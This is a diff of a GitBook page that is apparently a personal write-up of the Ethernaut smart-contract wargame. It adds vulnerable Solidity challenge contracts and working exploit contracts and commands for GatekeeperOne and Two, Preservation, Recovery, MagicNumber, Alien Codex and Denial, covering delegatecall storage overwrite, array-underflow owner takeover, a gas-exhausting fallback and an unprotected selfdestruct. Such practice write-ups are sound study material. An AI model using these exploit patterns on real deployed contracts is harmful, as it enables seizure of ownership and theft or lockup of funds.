@@ -998,64 +998,125 @@ contract GatekeeperOne {
 <li>gateTwo: gas remaining required to be an integer multiple of 10. Brute force with some meaningless code could pass this.</li>
 <li><p>gateThree: three requirements to <code>_gateKey</code> param:</p>
 <ul>
-<li><p><code>_gateKey[2:4]</code> == <code>_gateKey[0:2]</code></p>
+<li><p><code>_gateKey[4:7]</code> == <code>_gateKey[6:7]</code> (<code>_gate[4:5]</code> == <code>0x0000</code>)</p>
 </li>
-<li><p><code>_gateKey[0:4]</code> != <code>_gateKey[4:8]</code></p>
+<li><p><code>_gateKey[4:7]</code> != <code>_gateKey[0:7]</code>(<code>_gateKey[0:3]</code> != <code>0x00000000</code>)</p>
 </li>
-<li><p><code>_gateKey[2:4]</code> != <code>tx.origin[0:2]</code></p>
-</li>
-</ul>
+<li><p><code>_gateKey[4:7]</code> == <code>tx.origin[28:29]</code>(<code>_gateKey[4:5]</code>== <code>0x0000</code> &amp;&amp; <code>_gateKey[6:7]</code> == <code>tx.origin[28:29]</code>)</p>
 </li>
 </ul>
-<pre><code class="lang-js">  contract GateOneSkipper {
-      bytes8 _gateKey = bytes8(tx.origin) &amp; <span class="hljs-number">0xFFFFFFFF0000FFFF</span>;
+</li>
+</ul>
+<pre><code class="lang-js"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.6</span><span class="hljs-number">.0</span>;
 
-      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Skipper</span>(<span class="hljs-params">address _param</span>) <span class="hljs-title">public</span> <span class="hljs-title">returns</span>(<span class="hljs-params">bool</span>)</span>{
-          <span class="hljs-keyword">for</span> (uint256 i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">120</span>; i++) {
-              <span class="hljs-keyword">if</span> (address(_param).call.gas(i + <span class="hljs-number">150</span> + <span class="hljs-number">8191</span> * <span class="hljs-number">3</span>)(bytes4(keccak256(<span class="hljs-string">&quot;enter(bytes8)&quot;</span>)), _gateKey)) {
-                  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
-              }
-          }
-      }
-  }
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;./chall/GatekeeperOne.sol&quot;</span>;
+
+contract exp {
+
+    GatekeeperOne level13 = GatekeeperOne(<span class="hljs-number">0xF4F13D94A1c5A8e51DED1692171bC67260289E5E</span>);
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exploit</span>(<span class="hljs-params"></span>) <span class="hljs-title">external</span></span>{
+        bytes8 _gateKey = bytes8(uint64(tx.origin)) &amp; <span class="hljs-number">0xFFFFFFFF0000FFFF</span>;
+        <span class="hljs-keyword">for</span> (uint256 i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">300</span>; i++) {
+            (bool success, ) = address(level13).call{gas: i + (<span class="hljs-number">8191</span> * <span class="hljs-number">3</span>)}(abi.encodeWithSignature(<span class="hljs-string">&quot;enter(bytes8)&quot;</span>, _gateKey));
+            <span class="hljs-keyword">if</span> (success) {
+                <span class="hljs-keyword">break</span>;
+            }
+        }
+    }
+}
 </code></pre>
-<p>  hard. will compliete it later</p>
+<p><em>solidity changes so fast... only found 0.6.3 could compile this(with <code>Explicit type conversion</code> and <code>lower level call{}()</code> )</em></p>
 <h2 id="gatekeeper-two">GateKeeper Two</h2>
-<h2 id="naught-coin">naught coin</h2>
-<pre><code class="lang-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="lang-js"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-import &apos;openzeppelin-contracts-08/token/ERC20/ERC20.sol&apos;;
+contract GatekeeperTwo {
+
+  address public entrant;
+
+  modifier gateOne() {
+    <span class="hljs-built_in">require</span>(msg.sender != tx.origin);
+    _;
+  }
+
+  modifier gateTwo() {
+    uint x;
+    assembly { x := extcodesize(caller()) }
+    <span class="hljs-built_in">require</span>(x == <span class="hljs-number">0</span>);
+    _;
+  }
+
+  modifier gateThree(bytes8 _gateKey) {
+    <span class="hljs-built_in">require</span>(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
+    _;
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">enter</span>(<span class="hljs-params">bytes8 _gateKey</span>) <span class="hljs-title">public</span> <span class="hljs-title">gateOne</span> <span class="hljs-title">gateTwo</span> <span class="hljs-title">gateThree</span>(<span class="hljs-params">_gateKey</span>) <span class="hljs-title">returns</span> (<span class="hljs-params">bool</span>) </span>{
+    entrant = tx.origin;
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+  }
+}
+</code></pre>
+<p>Still three modifier:</p>
+<ul>
+<li>gateOne: same with the former challenge</li>
+<li>gateTwo: caller&apos;s code size should be 0, and will be satisfied if calling in constructor.</li>
+<li>gateTree: <code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max)</code>, equivalent to <code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max) == uint64(_gateKey)</code> and can be calculated in this way.</li>
+</ul>
+<pre><code class="lang-js"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;./chall/GateKeeperTwo.sol&quot;</span>;
+
+contract exp {
+    address Instance;
+
+    <span class="hljs-keyword">constructor</span>(address _addr) {
+      Instance = _addr;
+      unchecked{
+          bytes8 key = bytes8( uint64(bytes8(keccak256(abi.encodePacked(<span class="hljs-keyword">this</span>)))) ^ type(uint64).max  );
+          GatekeeperTwo(Instance).enter(key);
+      }
+    }
+}
+</code></pre>
+<h2 id="naught-coin">naught coin</h2>
+<pre><code class="lang-js"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&apos;openzeppelin-contracts-08/token/ERC20/ERC20.sol&apos;</span>;
 
  contract NaughtCoin is ERC20 {
 
-  // string public constant name = &apos;NaughtCoin&apos;;
-  // string public constant symbol = &apos;0x0&apos;;
-  // uint public constant decimals = 18;
-  uint public timeLock = block.timestamp + 10 * 365 days;
+  <span class="hljs-comment">// string public constant name = &apos;NaughtCoin&apos;;</span>
+  <span class="hljs-comment">// string public constant symbol = &apos;0x0&apos;;</span>
+  <span class="hljs-comment">// uint public constant decimals = 18;</span>
+  uint public timeLock = block.timestamp + <span class="hljs-number">10</span> * <span class="hljs-number">365</span> days;
   uint256 public INITIAL_SUPPLY;
   address public player;
 
-  constructor(address _player) 
+  <span class="hljs-keyword">constructor</span>(address _player) 
   ERC20(&apos;NaughtCoin&apos;, &apos;0x0&apos;) {
     player = _player;
-    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
-    // _totalSupply = INITIAL_SUPPLY;
-    // _balances[player] = INITIAL_SUPPLY;
+    INITIAL_SUPPLY = <span class="hljs-number">1000000</span> * (<span class="hljs-number">10</span>**uint256(decimals()));
+    <span class="hljs-comment">// _totalSupply = INITIAL_SUPPLY;</span>
+    <span class="hljs-comment">// _balances[player] = INITIAL_SUPPLY;</span>
     _mint(player, INITIAL_SUPPLY);
-    emit Transfer(address(0), player, INITIAL_SUPPLY);
+    emit Transfer(address(<span class="hljs-number">0</span>), player, INITIAL_SUPPLY);
   }
 
-  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
-    super.transfer(_to, _value);
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span>(<span class="hljs-params">address _to, uint256 _value</span>) <span class="hljs-title">override</span> <span class="hljs-title">public</span> <span class="hljs-title">lockTokens</span> <span class="hljs-title">returns</span>(<span class="hljs-params">bool</span>) </span>{
+    <span class="hljs-keyword">super</span>.transfer(_to, _value);
   }
 
-  // Prevent the initial owner from transferring tokens until the timelock has passed
+  <span class="hljs-comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span>
   modifier lockTokens() {
-    if (msg.sender == player) {
-      require(block.timestamp &gt; timeLock);
+    <span class="hljs-keyword">if</span> (msg.sender == player) {
+      <span class="hljs-built_in">require</span>(block.timestamp &gt; timeLock);
       _;
-    } else {
+    } <span class="hljs-keyword">else</span> {
      _;
     }
   } 
@@ -1066,6 +1127,304 @@ import &apos;openzeppelin-contracts-08/token/ERC20/ERC20.sol&apos;;
 <pre><code class="lang-js">contract.approve(player,toWei(<span class="hljs-string">&quot;1000000&quot;</span>))
 contract.transferFrom(player,contract.address,toWei(<span class="hljs-string">&quot;1000000&quot;</span>))
 </code></pre>
+<h2 id="preservation">Preservation</h2>
+<pre><code class="lang-js"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
+
+contract Preservation {
+
+  <span class="hljs-comment">// public library contracts </span>
+  address public timeZone1Library;
+  address public timeZone2Library;
+  address public owner; 
+  uint storedTime;
+  <span class="hljs-comment">// Sets the function signature for delegatecall</span>
+  bytes4 constant setTimeSignature = bytes4(keccak256(<span class="hljs-string">&quot;setTime(uint256)&quot;</span>));
+
+  <span class="hljs-keyword">constructor</span>(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
+    timeZone1Library = _timeZone1LibraryAddress; 
+    timeZone2Library = _timeZone2LibraryAddress; 
+    owner = msg.sender;
+  }
+
+  <span class="hljs-comment">// set the time for timezone 1</span>
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setFirstTime</span>(<span class="hljs-params">uint _timeStamp</span>) <span class="hljs-title">public</span> </span>{
+    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+  }
+
+  <span class="hljs-comment">// set the time for timezone 2</span>
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setSecondTime</span>(<span class="hljs-params">uint _timeStamp</span>) <span class="hljs-title">public</span> </span>{
+    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+  }
+}
+
+<span class="hljs-comment">// Simple library contract to set the time</span>
+contract LibraryContract {
+
+  <span class="hljs-comment">// stores a timestamp </span>
+  uint storedTime;  
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setTime</span>(<span class="hljs-params">uint _time</span>) <span class="hljs-title">public</span> </span>{
+    storedTime = _time;
+  }
+}
+</code></pre>
+<p><a href="https://learnblockchain.cn/article/5372" target="_blank">https://learnblockchain.cn/article/5372</a>: <code>delegateCall</code> stating variables are actually modified not by their names, but by their declared location in storage.</p>
+<p>That is mean when delegateCall LibraryContract, <code>storedTime</code> was pointed to the address of <code>timeZone1Library</code> in Preservation&apos;s storage. Through that, we can change the timeZone1Library to our evil contract, and call <code>setFirstTime</code> again to trigger evil code.</p>
+<pre><code class="lang-js"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
+
+contract exp {
+
+  <span class="hljs-comment">// stores a timestamp </span>
+  uint holder1;
+  uint holder2;
+  address owner;
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setTime</span>(<span class="hljs-params">uint _time</span>) <span class="hljs-title">public</span> </span>{
+    holder1 = _time;
+    owner = address(<span class="hljs-number">0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9</span>);
+  }
+}
+</code></pre>
+<pre><code class="lang-js">&gt; contract.setFirstTime(<span class="hljs-string">&apos;0x12e47be67263aF5939fe689A549c3e2a9110417F&apos;</span>) <span class="hljs-comment">//deployed exp contract address</span>
+&gt; <span class="hljs-keyword">await</span> web3.eth.getStorageAt(contract.address, <span class="hljs-number">0</span>)
+&lt; <span class="hljs-string">&apos;0x00000000000000000000000012e47be67263af5939fe689a549c3e2a9110417f&apos;</span>
+&gt; contract.setFirstTime(<span class="hljs-string">&apos;0x12e47be67263aF5939fe689A549c3e2a9110417F&apos;</span>) <span class="hljs-comment">//simply could be anything valid</span>
+</code></pre>
+<h2 id="recovery">Recovery</h2>
+<pre><code class="lang-js"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
+
+contract Recovery {
+
+  <span class="hljs-comment">//generate tokens</span>
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateToken</span>(<span class="hljs-params">string memory _name, uint256 _initialSupply</span>) <span class="hljs-title">public</span> </span>{
+    <span class="hljs-keyword">new</span> SimpleToken(_name, msg.sender, _initialSupply);
+
+  }
+}
+
+contract SimpleToken {
+
+  string public name;
+  mapping (address =&gt; uint) public balances;
+
+  <span class="hljs-comment">// constructor</span>
+  <span class="hljs-keyword">constructor</span>(string memory _name, address _creator, uint256 _initialSupply) {
+    name = _name;
+    balances[_creator] = _initialSupply;
+  }
+
+  <span class="hljs-comment">// collect ether in return for tokens</span>
+  receive() external payable {
+    balances[msg.sender] = msg.value * <span class="hljs-number">10</span>;
+  }
+
+  <span class="hljs-comment">// allow transfers of tokens</span>
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span>(<span class="hljs-params">address _to, uint _amount</span>) <span class="hljs-title">public</span> </span>{ 
+    <span class="hljs-built_in">require</span>(balances[msg.sender] &gt;= _amount);
+    balances[msg.sender] = balances[msg.sender] - _amount;
+    balances[_to] = _amount;
+  }
+
+  <span class="hljs-comment">// clean up after ourselves</span>
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">destroy</span>(<span class="hljs-params">address payable _to</span>) <span class="hljs-title">public</span> </span>{
+    selfdestruct(_to);
+  }
+}
+</code></pre>
+<p>Tracking the contract creation(Internal transcation) on etherscan would show the address of created token contract. Any note that <code>destroy</code> function was setted to be public, call this function could solve this challenge</p>
+<pre><code class="lang-bash">$ cast send 0xe8b72c8696d6370bc1b0ba465477c3c3c650cde0 <span class="hljs-string">&quot;destroy(address)&quot;</span> -r <span class="hljs-string">&quot;https://1rpc.io/sepolia&quot;</span> --private-key &lt;64bytesKey&gt; -- <span class="hljs-string">&apos;0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9&apos;</span>
+</code></pre>
+<blockquote>
+<p>Contract addresses are deterministic and are calculated by <code>keccak256(address, nonce)</code> where the <code>address</code> is the address of the contract (or ethereum address that created the transaction) and <code>nonce</code> is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).</p>
+<p>Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.</p>
+<p>An interesting <a href="https://swende.se/blog/Ethereum_quirks_and_vulns.html" target="_blank">blog post</a> by Martin Swende details potential use cases of this.</p>
+<p>If you&apos;re going to implement this technique, make sure you don&apos;t miss the nonce, or your funds will be lost forever.</p>
+</blockquote>
+<p>seems not intended... but the blog interesting exactly.</p>
+<h2 id="magicnumber">MagicNumber</h2>
+<pre><code class="lang-js"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
+
+contract MagicNum {
+
+  address public solver;
+
+  <span class="hljs-keyword">constructor</span>() {}
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setSolver</span>(<span class="hljs-params">address _solver</span>) <span class="hljs-title">public</span> </span>{
+    solver = _solver;
+  }
+
+  <span class="hljs-comment">/*
+    ____________/\\\_______/\\\\\\\\\_____        
+     __________/\\\\\_____/\\\///////\\\___       
+      ________/\\\/\\\____\///______\//\\\__      
+       ______/\\\/\/\\\______________/\\\/___     
+        ____/\\\/__\/\\\___________/\\\//_____    
+         __/\\\\\\\\\\\\\\\\_____/\\\//________   
+          _\///////////\\\//____/\\\/___________  
+           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
+            ___________\///_____\///////////////__
+  */</span>
+}
+</code></pre>
+<blockquote>
+<p>To solve this level, you only need to provide the Ethernaut with a <code>Solver</code>, a contract that responds to <code>whatIsTheMeaningOfLife()</code> with the right number.</p>
+<p>Easy right? Well... there&apos;s a catch.</p>
+<p>The solver&apos;s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin&apos; really really itty-bitty tiny: 10 opcodes at most.</p>
+<p>Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That&apos;s right: Raw EVM bytecode.</p>
+<p>Good luck!</p>
+</blockquote>
+<p>write valid opcodes to implement the contract like following: (I found it on the internet somewhere)</p>
+<ol>
+<li><p>0x60 - PUSH1 --&gt; PUSH(0x2a) --&gt; 0x602a (Pushing 2a or 42)</p>
+</li>
+<li><p>0x60 - PUSH1 --&gt; PUSH(0x80) --&gt; 0x6080 (Pushing an arbitrary selected memory slot 80)</p>
+</li>
+<li><p>0x52 - MSTORE --&gt; MSTORE --&gt; 0x52 (Store value p=0x2a at position v=0x80 in memory)</p>
+</li>
+<li><p>0x60 - PUSH1 --&gt; PUSH(0x20) --&gt; 0x6020 (Size of value is 32 bytes)</p>
+</li>
+<li><p>0x60 - PUSH1 --&gt; PUSH(0x80) --&gt; 0x6080 (Value was stored in slot 0x80)</p>
+</li>
+<li><p>0xf3 - RETURN --&gt; RETURN --&gt; 0xf3 (Return value at p=0x80 slot and of size s=0x20)</p>
+</li>
+</ol>
+<pre><code class="lang-js"><span class="hljs-comment">// deploy it and get contractAddress</span>
+<span class="hljs-keyword">await</span> web3.eth.sendTransaction({ <span class="hljs-keyword">from</span>:player, data: <span class="hljs-string">&apos;0x69602a60005260206000f3600052600a6016f3&apos;</span> });
+<span class="hljs-comment">// submit the solver contract</span>
+<span class="hljs-keyword">await</span> contract.setSolver(<span class="hljs-string">&apos;0x5ba95745bb7ae5ac15ab9968e665ab761ca7b62f&apos;</span>)
+</code></pre>
+<h2 id="alien-codex">Alien Codex</h2>
+<pre><code class="lang-js"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.5</span><span class="hljs-number">.0</span>;
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&apos;../helpers/Ownable-05.sol&apos;</span>;
+
+contract AlienCodex is Ownable {
+
+  bool public contact;
+  bytes32[] public codex;
+
+  modifier contacted() {
+    assert(contact);
+    _;
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makeContact</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
+    contact = <span class="hljs-literal">true</span>;
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">record</span>(<span class="hljs-params">bytes32 _content</span>) <span class="hljs-title">contacted</span> <span class="hljs-title">public</span> </span>{
+    codex.push(_content);
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">retract</span>(<span class="hljs-params"></span>) <span class="hljs-title">contacted</span> <span class="hljs-title">public</span> </span>{
+    codex.length--;
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">revise</span>(<span class="hljs-params">uint i, bytes32 _content</span>) <span class="hljs-title">contacted</span> <span class="hljs-title">public</span> </span>{
+    codex[i] = _content;
+  }
+}
+</code></pre>
+<p>When array declared, it will occupy a slot in memory like other type do as its length, and set a base address for the data area by following formula:</p>
+<pre><code>keccak(slot)
+</code></pre><p>and the data will be store like:</p>
+<pre><code>codex[0] =&gt; (keccak(slot) + 0) % 2 ** 256
+codex[1] =&gt; (keccak(slot) + 1) % 2 ** 256
+...
+codex[i] =&gt; (keccak(slot) + i) % 2 ** 256
+</code></pre><p>thus we can override the data of owner to claim ownership.</p>
+<pre><code>&amp;codex[i] == &amp;owner
+=&gt; (keccak(length_slot) + i) % 2 ** 256 == 0
+=&gt; (keccak(length_slot) + i) == 2 ** 256
+=&gt; i == 2 ** 256 - keccak(length_slot)
++ length_slot = 1
+=&gt; i == 2 ** 256 - keccak(1)
+</code></pre><p>In addition, it should be noted that the array value will be determined according to the length range, so it is necessary to cause the length variable to underflow first.</p>
+<pre><code class="lang-js"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
+
+interface IAlienCodex {
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makeContact</span>(<span class="hljs-params"></span>) <span class="hljs-title">external</span>;
+    <span class="hljs-title">function</span> <span class="hljs-title">retract</span>(<span class="hljs-params"></span>) <span class="hljs-title">external</span>;
+    <span class="hljs-title">function</span> <span class="hljs-title">revise</span>(<span class="hljs-params">uint i, bytes32 _content</span>) <span class="hljs-title">external</span>;
+}
+
+<span class="hljs-title">contract</span> <span class="hljs-title">exp</span> </span>{
+    IAlienCodex Instance;
+
+    <span class="hljs-keyword">constructor</span>(address _addr) {
+      Instance = IAlienCodex(_addr);
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
+        unchecked{
+            Instance.makeContact();
+            Instance.retract();
+            uint index = uint256(<span class="hljs-number">2</span>)**uint256(<span class="hljs-number">256</span>) - uint256(keccak256(abi.encodePacked(uint256(<span class="hljs-number">1</span>))));
+            Instance.revise(index, bytes32(uint256(uint160(tx.origin))));
+        }
+    }
+
+}
+</code></pre>
+<h2 id="denial">Denial</h2>
+<pre><code class="lang-js"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
+contract Denial {
+
+    address public partner; <span class="hljs-comment">// withdrawal partner - pay the gas, split the withdraw</span>
+    address public constant owner = address(<span class="hljs-number">0xA9E</span>);
+    uint timeLastWithdrawn;
+    mapping(address =&gt; uint) withdrawPartnerBalances; <span class="hljs-comment">// keep track of partners balances</span>
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setWithdrawPartner</span>(<span class="hljs-params">address _partner</span>) <span class="hljs-title">public</span> </span>{
+        partner = _partner;
+    }
+
+    <span class="hljs-comment">// withdraw 1% to recipient and 1% to owner</span>
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
+        uint amountToSend = address(<span class="hljs-keyword">this</span>).balance / <span class="hljs-number">100</span>;
+        <span class="hljs-comment">// perform a call without checking return</span>
+        <span class="hljs-comment">// The recipient can revert, the owner will still get their share</span>
+        partner.call{value:amountToSend}(<span class="hljs-string">&quot;&quot;</span>);
+        payable(owner).transfer(amountToSend);
+        <span class="hljs-comment">// keep track of last withdrawal time</span>
+        timeLastWithdrawn = block.timestamp;
+        withdrawPartnerBalances[partner] +=  amountToSend;
+    }
+
+    <span class="hljs-comment">// allow deposit of funds</span>
+    receive() external payable {}
+
+    <span class="hljs-comment">// convenience function</span>
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">contractBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint</span>) </span>{
+        <span class="hljs-keyword">return</span> address(<span class="hljs-keyword">this</span>).balance;
+    }
+}
+</code></pre>
+<p>To complete this level, we need prevent the  owner from withdrawing funds when they call <code>withdraw()</code>. that&apos;s mean we should revert the tx in <code>withdraw</code> function calling process. After trying it, I found that contracts without payable will not cause revert. But we can cause gas exhaustion through an infinite loop, thus preventing the transaction from continuing.</p>
+<pre><code class="lang-js"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
+
+contract exp{
+    fallback () payable external {
+        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>){}
+    }
+}
+</code></pre>
+<blockquote>
+<p>This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.</p>
+<p>If you are using a low level <code>call</code> to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example <code>call.gas(100000).value()</code>.</p>
+<p>Typically one should follow the <a href="http://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern" target="_blank">checks-effects-interactions</a> pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.</p>
+<p><em>Note</em>: An external <code>CALL</code> can use at most 63/64 of the gas currently available at the time of the <code>CALL</code>. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.</p>
+</blockquote>
+<h2 id="shop">shop</h2>
 
                                 
                                 </section>
@@ -1109,7 +1468,7 @@ contract.transferFrom(player,contract.address,toWei(<span class="hljs-string">&q
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"Ethernaut","level":"1.4","depth":1,"next":{"title":"羊城杯 2023 web writeup","level":"1.5","depth":1,"anchor":"#20230903","path":"羊城杯 2023 web writeup.md","ref":"羊城杯 2023 web writeup.md#20230903","articles":[]},"previous":{"title":"TCP1P CTF 2023 blockchain","level":"1.3","depth":1,"anchor":"#231016","path":"TCP1P CTF 2023 blockchain.md","ref":"TCP1P CTF 2023 blockchain.md#231016","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr"],"root":"./pages","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"fontsettings":{"theme":"night","family":"serif","size":2},"highlight":{},"search":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"gitbook":"*"},"file":{"path":"Ethernaut.md","mtime":"2023-10-23T12:04:52.843Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-11-03T13:24:24.089Z"},"basePath":".","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Ethernaut","level":"1.4","depth":1,"next":{"title":"羊城杯 2023 web writeup","level":"1.5","depth":1,"anchor":"#20230903","path":"羊城杯 2023 web writeup.md","ref":"羊城杯 2023 web writeup.md#20230903","articles":[]},"previous":{"title":"TCP1P CTF 2023 blockchain","level":"1.3","depth":1,"anchor":"#231016","path":"TCP1P CTF 2023 blockchain.md","ref":"TCP1P CTF 2023 blockchain.md#231016","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr"],"root":"./pages","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"fontsettings":{"theme":"night","family":"serif","size":2},"highlight":{},"search":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"gitbook":"*"},"file":{"path":"Ethernaut.md","mtime":"2023-11-18T16:18:58.825Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-11-18T16:19:41.522Z"},"basePath":".","book":{"language":""}});
         });
     </script>
 </div>
